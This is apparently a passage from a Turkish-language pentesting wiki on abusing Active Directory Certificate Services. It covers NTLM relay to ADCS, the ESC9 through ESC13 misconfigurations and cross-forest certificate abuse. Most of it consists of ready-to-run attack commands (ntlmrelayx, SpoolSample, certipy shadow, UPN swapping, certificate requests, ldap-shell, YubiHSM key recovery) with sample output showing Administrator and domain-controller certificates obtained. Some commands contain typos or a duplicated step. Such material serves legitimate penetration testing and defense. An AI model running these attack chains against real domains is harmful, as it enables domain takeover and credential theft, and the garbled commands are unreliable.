# Prepare a proxy that the attacker can use
socks 1080

## In the attackers
proxychains ntlmrelayx.py -t http://<AC Server IP>/certsrv/certfnsh.asp -smb2support --adcs --no-http-server

# Force authentication from victim to compromised machine with port forwards
execute-assembly C:\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe <victim> <compromised>
```
#### [Certipy](https://github.com/ly4k/Certipy) ile Kötüye Kullanım

Sertifika talebi, varsayılan olarak Certipy tarafından `Machine` veya `User` şablonuna dayalı olarak yapılır, bu da iletilecek hesap adının `$` ile bitip bitmediğine bağlı olarak belirlenir. Alternatif bir şablonun belirtilmesi, `-template` parametresinin kullanımıyla gerçekleştirilebilir.

[PetitPotam](https://github.com/ly4k/PetitPotam) gibi bir teknik daha sonra kimlik doğrulamayı zorlamak için kullanılabilir. Alan denetleyicileriyle uğraşırken, `-template DomainController` belirtilmesi gereklidir.
```bash
certipy relay -ca ca.corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Targeting http://ca.corp.local/certsrv/certfnsh.asp
[*] Listening on 0.0.0.0:445
[*] Requesting certificate for 'CORP\\Administrator' based on the template 'User'
[*] Got certificate with UPN 'Administrator@corp.local'
[*] Certificate object SID is 'S-1-5-21-980154951-4172460254-2779440654-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
## Güvenlik Uzantısı Yok - ESC9 <a href="#id-5485" id="id-5485"></a>

### Açıklama

Yeni değer **`CT_FLAG_NO_SECURITY_EXTENSION`** (`0x80000`) olarak adlandırılan **`msPKI-Enrollment-Flag`** için ESC9, bir sertifikada **yeni `szOID_NTDS_CA_SECURITY_EXT` güvenlik uzantısının gömülmesini engeller. Bu bayrak, `StrongCertificateBindingEnforcement` `1` olarak ayarlandığında (varsayılan ayar), `2` ayarına karşıt olarak önem kazanır. ESC9'un önemi, daha zayıf bir sertifika eşlemesi Kerberos veya Schannel için sömürülebilirken (ESC10 gibi), ESC9'un olmamasının gereksinimleri değiştirmeyeceği senaryolarda artar.

Bu bayrağın ayarının önem kazandığı koşullar şunları içerir:

* `StrongCertificateBindingEnforcement` `2` olarak ayarlanmamıştır (varsayılan `1` olur), veya `CertificateMappingMethods` `UPN` bayrağını içerir.
* Sertifika, `msPKI-Enrollment-Flag` ayarında `CT_FLAG_NO_SECURITY_EXTENSION` bayrağı ile işaretlenmiştir.
* Sertifika tarafından herhangi bir istemci kimlik doğrulama EKU'su belirtilmiştir.
* Herhangi bir hesap üzerinde `GenericWrite` izinleri başka bir hesabı tehlikeye atmak için kullanılabilir.

### Kötüye Kullanım Senaryosu

`John@corp.local`'ın `Jane@corp.local` üzerinde `GenericWrite` izinleri olduğunu varsayalım ve `Administrator@corp.local`'ı tehlikeye atma amacı taşısın. `Jane@corp.local`'ın kaydolmasına izin verilen `ESC9` sertifika şablonu, `msPKI-Enrollment-Flag` ayarındaki `CT_FLAG_NO_SECURITY_EXTENSION` bayrağı ile yapılandırılmıştır.

Başlangıçta, `Jane`'in hash'i, `John`'un `GenericWrite` izinleri sayesinde Gölge Kimlik Bilgileri kullanılarak elde edilir:
```bash
certipy shadow auto -username John@corp.local -password Passw0rd! -account Jane
```
Sonuç olarak, `Jane`'in `userPrincipalName` değeri `Administrator` olarak değiştirilir, bilerek `@corp.local` alan kısmı atlanır:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
Bu değişiklik, `Administrator@corp.local` olarak kalırken `Administrator`'ın `userPrincipalName`'i olarak farklı kalmasını ihlal etmez.

Bunu takiben, zayıf olarak işaretlenmiş `ESC9` sertifika şablonu, `Jane` olarak talep edilir:
```bash
certipy req -username jane@corp.local -hashes <hash> -ca corp-DC-CA -template ESC9
```
Belirtilen sertifikanın `userPrincipalName` alanının, herhangi bir "object SID" içermediği belirtilir.

`Jane`'in `userPrincipalName` alanı daha sonra orijinali olan `Jane@corp.local` olarak geri döndürülür:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
Denenmiş sertifika ile kimlik doğrulama yapmaya çalışmak şu anda `Administrator@corp.local`'in NT hash'ini verir. Sertifikanın alan belirtisi eksik olduğundan komutta `-domain <domain>` bulunmalıdır:
```bash
certipy auth -pfx adminitrator.pfx -domain corp.local
```
## Zayıf Sertifika Eşlemeleri - ESC10

### Açıklama

Eşlemeleri ESC10 tarafından belirtilen iki kayıt defteri değeri şunlardır:

* `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel` altında `CertificateMappingMethods` için varsayılan değer `0x18` (`0x8 | 0x10`), önceden `0x1F` olarak ayarlanmıştır.
* `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc` altında `StrongCertificateBindingEnforcement` için varsayılan ayar `1`, önceden `0` idi.

**Durum 1**

`StrongCertificateBindingEnforcement` değeri `0` olarak yapılandırıldığında.

**Durum 2**

`CertificateMappingMethods` içerisinde `UPN` bitini (`0x4`) içerdiğinde.

### Kötüye Kullanım Durumu 1

`StrongCertificateBindingEnforcement` değeri `0` olarak yapılandırıldığında, `GenericWrite` izinlerine sahip bir hesap A, herhangi bir hesap B'yi tehlikeye atmak için sömürülebilir.

Örneğin, `Jane@corp.local` üzerinde `GenericWrite` izinlerine sahip olan bir saldırgan, `Administrator@corp.local` hesabını tehlikeye atmayı amaçlar. İşlem, herhangi bir sertifika şablonunun kullanılmasına izin verirken ESC9 ile aynıdır.

Başlangıçta, `Jane`'in hash'i, Shadow Credentials kullanılarak alınır, `GenericWrite` kullanılarak sömürülür.
```bash
certipy shadow autho -username John@corp.local -p Passw0rd! -a Jane
```
Sonuç olarak, `Jane`'in `userPrincipalName` değeri `Yönetici` olarak değiştirilir, `@corp.local` kısmı kasıtlı olarak atlanarak kısıtlama ihlali önlenir.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
Ardından, varsayılan `User` şablonunu kullanarak `Jane` olarak istemci kimliği doğrulamasını sağlayan bir sertifika istenir.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
`Jane`'in `userPrincipalName` değeri daha sonra orijinal değeri olan `Jane@corp.local` olarak geri alınır.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
Elde edilen sertifika ile kimlik doğrulama yapmak, sertifikada etki alanı detaylarının olmaması nedeniyle komutta etki alanının belirtilmesini gerektirir.
```bash
certipy auth -pfx administrator.pfx -domain corp.local
```
### Kötüye Kullanım Durumu 2

`CertificateMappingMethods` içerisinde `UPN` bit bayrağını (`0x4`) içeren bir hesap A, `userPrincipalName` özelliğine sahip olmayan herhangi bir hesap B'yi (makine hesapları ve yerleşik etki alanı yöneticisi `Administrator` dahil) tehlikeye atabilir. 

Burada, `GenericWrite` izinlerine sahip bir hesap A'nın, `Jane`'in hash'ini Shadow Credentials aracılığıyla elde ederek, `DC$@corp.local` hesabını tehlikeye atma hedeflenmektedir.
```bash
certipy shadow auto -username John@corp.local -p Passw0rd! -account Jane
```
`Jane`'in `userPrincipalName` değeri daha sonra `DC$@corp.local` olarak ayarlanır.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'DC$@corp.local'
```
Bir sertifika istemcisi kimliği doğrulama için varsayılan `Kullanıcı` şablonunu kullanarak `Jane` olarak istenir.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
`Jane`'in `userPrincipalName`'i bu işlem sonrasında orijinal haline döndürülür.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'Jane@corp.local'
```
Schanel üzerinden kimlik doğrulamak için, Certipy'nin `-ldap-shell` seçeneği kullanılır ve kimlik doğrulama başarısı `u:CORP\DC$` olarak gösterilir.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
LDAP kabuğu aracılığıyla, `set_rbcd` gibi komutlar Kaynak Tabanlı Kısıtlanmış Delegasyon (RBCD) saldırılarını etkinleştirerek, etki alanı denetleyicisini tehlikeye atabilir.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
Bu zafiyet, `userPrincipalName` eksik olan veya `sAMAccountName` ile eşleşmeyen herhangi bir kullanıcı hesabına da uzanır; varsayılan `Administrator@corp.local`, yükseltilmiş LDAP ayrıcalıkları ve varsayılan olarak `userPrincipalName`'in bulunmaması nedeniyle ana hedeflerden biridir.

## ICPR'ye NTLM Aktarımı - ESC11

### Açıklama

CA Sunucusu, `IF_ENFORCEENCRYPTICERTREQUEST` ile yapılandırılmamışsa, RPC hizmeti aracılığıyla imzalama olmadan NTLM aktarım saldırıları gerçekleştirebilir. [Burada referans](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/).

`certipy` kullanarak `İstekler için Şifreleme Zorunlu`nun Devre Dışı Bırakıldığını sorgulayabilir ve `certipy`, `ESC11` Zafiyetlerini gösterecektir.
```bash
$ certipy find -u mane@domain.local -p 'password' -dc-ip 192.168.100.100 -stdout
Certipy v4.0.0 - by Oliver Lyak (ly4k)

Certificate Authorities
0
CA Name                             : DC01-CA
DNS Name                            : DC01.domain.local
Certificate Subject                 : CN=DC01-CA, DC=domain, DC=local
....
Enforce Encryption for Requests     : Disabled
....
[!] Vulnerabilities
ESC11                             : Encryption is not enforced for ICPR requests and Request Disposition is set to Issue

```
### Kötüye Kullanım Senaryosu

Bir röle sunucusu kurulması gerekmektedir:
``` bash
$ certipy relay -target 'rpc://DC01.domain.local' -ca 'DC01-CA' -dc-ip 192.168.100.100
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Targeting rpc://DC01.domain.local (ESC11)
[*] Listening on 0.0.0.0:445
[*] Connecting to ncacn_ip_tcp:DC01.domain.local[135] to determine ICPR stringbinding
[*] Attacking user 'Administrator@DOMAIN'
[*] Template was not defined. Defaulting to Machine/User
[*] Requesting certificate for user 'Administrator' with template 'User'
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 10
[*] Got certificate with UPN 'Administrator@domain.local'
[*] Certificate object SID is 'S-1-5-21-1597581903-3066826612-568686062-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
Not: Domain denetleyicileri için, `-template`'yi DomainController'da belirtmeliyiz.

Veya [sploutchy'nin impacket çatalını](https://github.com/sploutchy/impacket) kullanarak:
``` bash
$ ntlmrelayx.py -t rpc://192.168.100.100 -rpc-mode ICPR -icpr-ca-name DC01-CA -smb2support
```
## YubiHSM ile ADCS CA'ya kabuk erişimi - ESC12

### Açıklama

Yöneticiler, Sertifika Otoritesini "Yubico YubiHSM2" gibi harici bir cihaza kurabilirler.

USB cihazı CA sunucusuna bir USB bağlantı noktası aracılığıyla bağlandığında veya CA sunucusu bir sanal makine ise bir USB cihaz sunucusu aracılığıyla bağlandığında, YubiHSM'de anahtarları oluşturmak ve kullanmak için Kimlik Depolama Sağlayıcısı'nın gerektirdiği bir kimlik doğrulama anahtarı (bazen "şifre" olarak da adlandırılır) gereklidir.

Bu anahtar/şifre, YubiHSM'deki `HKEY_LOCAL_MACHINE\SOFTWARE\Yubico\YubiHSM\AuthKeysetPassword` kayıt defterinde düz metin olarak saklanır.

Referans [burada](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm).

### Kötüye Kullanım Senaryosu

Eğer CA'nın özel anahtarı fiziksel bir USB cihazında depolanmışsa ve kabuk erişimine sahipseniz, anahtarı kurtarmak mümkündür.

İlk olarak, CA sertifikasını (bu genel bir bilgidir) elde etmeniz ve ardından:
```cmd
# import it to the user store with CA certificate
$ certutil -addstore -user my <CA certificate file>

# Associated with the private key in the YubiHSM2 device
$ certutil -csp "YubiHSM Key Storage Provider" -repairstore -user my <CA Common Name>
```
## OID Grup Bağlantı Kötüye Kullanımı - ESC13

### Açıklama

`msPKI-Certificate-Policy` özelliği, sertifika şablonuna verilmesi gereken politikayı eklemeye olanak tanır. Politikaları veren `msPKI-Enterprise-Oid` nesneleri, PKI OID konteynerinin Yapılandırma İsimlendirme Bağlamı'nda (CN=OID,CN=Public Key Services,CN=Services) keşfedilebilir. Bu nesnenin `msDS-OIDToGroupLink` özelliği kullanılarak bir politika bir AD grubuna bağlanabilir, böylece bir kullanıcının sertifikayı sunması durumunda, bu kullanıcının grup üyesi gibi ayrıcalıklara sahip olmasına izin verilir. [Referans burada](https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53).

Başka bir deyişle, bir kullanıcının bir sertifika kaydına izin verildiğinde ve sertifika bir OID grubuna bağlandığında, kullanıcı bu grubun ayrıcalıklarını devralabilir.

OIDToGroupLink'ı bulmak için [Check-ADCSESC13.ps1](https://github.com/JonasBK/Powershell/blob/master/Check-ADCSESC13.ps1) kullanın:
```powershell
Enumerating OIDs
------------------------
OID 23541150.FCB720D24BC82FBD1A33CB406A14094D links to group: CN=VulnerableGroup,CN=Users,DC=domain,DC=local

OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
Enumerating certificate templates
------------------------
Certificate template VulnerableTemplate may be used to obtain membership of CN=VulnerableGroup,CN=Users,DC=domain,DC=local

Certificate template Name: VulnerableTemplate
OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
```
### Kötüye Kullanım Senaryosu

`certipy find` veya `Certify.exe find /showAllPermissions` komutlarını kullanarak bir kullanıcı izni bulun.

Eğer `John`, `VulnerableTemplate` için kayıt yapma iznine sahipse, kullanıcı `VulnerableGroup` grubunun ayrıcalıklarını devralabilir.

Yapması gereken tek şey şablonu belirtmek, bu sayede OIDToGroupLink haklarına sahip bir sertifika alacaktır.
```bash
certipy req -u "John@domain.local" -p "password" -dc-ip 192.168.100.100 -target "DC01.domain.local" -ca 'DC01-CA' -template 'VulnerableTemplate'
```
## Sertifikalarla Ormanların Kompromize Edilmesi, Edilgen Sesle Açıklanmış

### Kompromize Edilmiş CA'lar Tarafından Orman Güvenliğinin Kırılması

**Ormanlar arası kayıt** için yapılandırma oldukça basittir. **Kaynak ormanın kök CA sertifikası** yöneticiler tarafından **hesap ormanlarına yayınlanır** ve **kaynak ormanın kurumsal CA** sertifikaları, her hesap ormanında **`NTAuthCertificates` ve AIA konteynerlerine eklenir**. Bu düzenleme, **kaynak ormandaki CA'ya**, yönettiği PKI için **diğer tüm ormanlar üzerinde tam kontrol** verir. Bu CA, **saldırganlar tarafından ele geçirilirse**, hem kaynak hem de hesap ormanlarındaki tüm kullanıcılar için sertifikaları **onlar tarafından sahte olarak oluşturulabilir**, böylece ormanın güvenlik sınırı **kırılabilir**.

### Yabancı İlkelerin Kayıt Ayrıcalıkları Verilmesi

Çoklu orman ortamlarında, **kimlik doğrulama kullanıcıları veya yabancı ilkelerin** (Enterprise CA'nın ait olduğu ormandan farklı olan kullanıcılar/gruplar) **kayıt ve düzenleme haklarına izin veren sertifika şablonlarını yayınlayan** Kurumsal CA'lar konusunda dikkat gereklidir.\
Bir güvenlik ilişkisi boyunca kimlik doğrulaması yapıldığında, AD tarafından kullanıcının belirteci içine **Kimlik Doğrulanmış Kullanıcılar SID** eklenir. Dolayısıyla, bir alanın, **Kimlik Doğrulanmış Kullanıcılar kayıt haklarına izin veren bir şablona sahip olması durumunda**, bir kullanıcının **farklı bir ormandan bir şablona kaydolabileceği** potansiyel olarak mümkündür. Benzer şekilde, bir şablon tarafından **kayıt hakları açıkça yabancı bir ilkeye verildiğinde**, böylece bir ormandan bir ilkenin **başka bir ormandan bir şablona kaydolmasına olanak tanıyan bir ormanlar arası erişim kontrol ilişkisi oluşturulur**.

Her iki senaryo da bir ormandan diğerine **saldırı yüzeyinde artışa** neden olur. Bir saldırganın sertifika şablonunun ayarlarını kullanarak yabancı bir alan içinde ek ayrıcalıklar elde etmesi mümkündür.
